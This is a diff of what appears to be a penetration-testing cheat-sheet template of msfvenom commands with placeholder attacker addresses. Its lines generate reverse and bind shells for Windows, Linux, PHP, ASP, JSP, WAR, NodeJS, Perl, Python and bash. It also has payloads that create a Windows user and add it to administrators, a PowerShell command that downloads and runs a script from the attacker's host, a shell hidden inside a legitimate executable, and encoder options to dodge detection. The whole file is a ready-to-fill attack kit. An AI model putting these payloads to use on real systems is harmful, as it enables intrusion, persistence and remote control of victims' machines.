@@ -1,29 +1,73 @@
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f elf > shell.elf
+# refer:https://book.hacktricks.xyz/shells/shells/untitled
+# refer:https://github.com/ShutdownRepo/shellerator
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f exe > shell.exe
 
-msfvenom -p osx/x86/shell_reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f macho > shell.macho
+# Common params when creating a shellcode
+# desc: Common params
+-b "\x00\x0a\x0d" -f c -e x86/shikata_ga_nai -i 5 EXITFUNC=thread PrependSetuid=True
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f asp > shell.asp
 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f raw > shell.jsp
+@params.desc(Common params)
+@params.recommend(-b "\x00\x0a\x0d" -f c -e x86/shikata_ga_nai -i 5 EXITFUNC=thread PrependSetuid=True)
 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f war > shell.war
 
-msfvenom -p cmd/unix/reverse_python LHOST="#{LHOST}" LPORT=#{LPORT} -f raw > shell.py
 
-msfvenom -p cmd/unix/reverse_bash LHOST="#{LHOST}" LPORT=#{LPORT} -f raw > shell.sh
-
-msfvenom -p cmd/unix/reverse_perl LHOST="#{LHOST}" LPORT=#{LPORT} -f raw > shell.pl
-
-# desc: Windows Staged reverse TCP 
+# desc: Windows Reverse Shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe > reverse.exe
 
-# desc: Windows Stageless reverse TCP 
-msfvenom -p windows/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe > reverse.exe
+# desc: Windows Bind Shell
+msfvenom -p windows/meterpreter/bind_tcp RHOST=#{LHOST} LPORT=#{LPORT} -f exe > bind.exe
 
-# desc: Linux Staged reverse TCP 
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f elf >reverse.elf
+# desc: Windows Create User
+msfvenom -p windows/adduser USER=#{user} PASS=#{user}@#{pwd} -f exe > adduser.exe
 
-# desc: Linux Stageless reverse TCP 
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f elf >reverse.elf
+# desc: Windows CMD Shell
+msfvenom -p windows/shell/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe > prompt.exe
+
+# desc: Windows Execute Command Download
+msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://#{LHOST}/#{download_file_path}')\"" -f exe > pay.exe
+@download_file_path.desc(下载文件路径)
+
+# desc: Windows Execute Command Add Group
+msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators #{user} /add" -f exe > pay.exe
+
+# desc: Windows Embedded inside executable
+msfvenom -p windows/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -x #{origin_exe} -f exe -o plinkmeter.exe
+@origin_exe.desc(要嵌入的文件)
+
+
+# desc: Linux Reverse Shell x86
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f elf > reverse.elf
+
+# desc: Linux Reverse Shell x64
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f elf > shell.elf
+
+# desc: Linux Bind Shell
+msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=#{LHOST} LPORT=#{LPORT} -f elf > bind.elf
+
+# desc: PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+# desc: ASP/x
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f #{asp_type} >reverse.#{asp_type}
+@asp_type.recommend(asp)
+@asp_type.recommend(aspx)
+
+# desc: JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f raw> reverse.jsp
+
+# desc: WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f war > reverse.war
+
+# desc: NodeJS
+msfvenom -p nodejs/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT}
+
+# desc: Perl
+msfvenom -p cmd/unix/reverse_perl LHOST=#{LHOST} LPORT=#{LPORT} -f raw > reverse.pl
+
+# desc: Python
+msfvenom -p cmd/unix/reverse_python LHOST=#{LHOST} LPORT=#{LPORT} -f raw > reverse.py
+
+# desc: Base
+msfvenom -p cmd/unix/reverse_bash LHOST=#{LHOST} LPORT=#{LPORT} -f raw > shell.sh
